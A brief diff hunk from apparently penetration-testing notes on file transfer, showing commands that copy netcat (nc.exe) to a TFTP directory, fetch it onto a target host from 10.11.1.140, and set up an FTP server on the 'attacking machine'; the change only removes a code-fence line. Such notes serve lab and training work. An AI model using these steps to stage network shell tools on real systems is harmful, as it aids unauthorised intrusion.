@@ -14,7 +14,6 @@ cp /usr/share/windows-binaries/nc.exe /tftp/
 tftp -i 10.11.1.140 GET nc.exe
 ```
 #### FTP File Transfer
-```
 On attacking machine, setup an ftp server
 `apt-get install pure-ftpd`
 
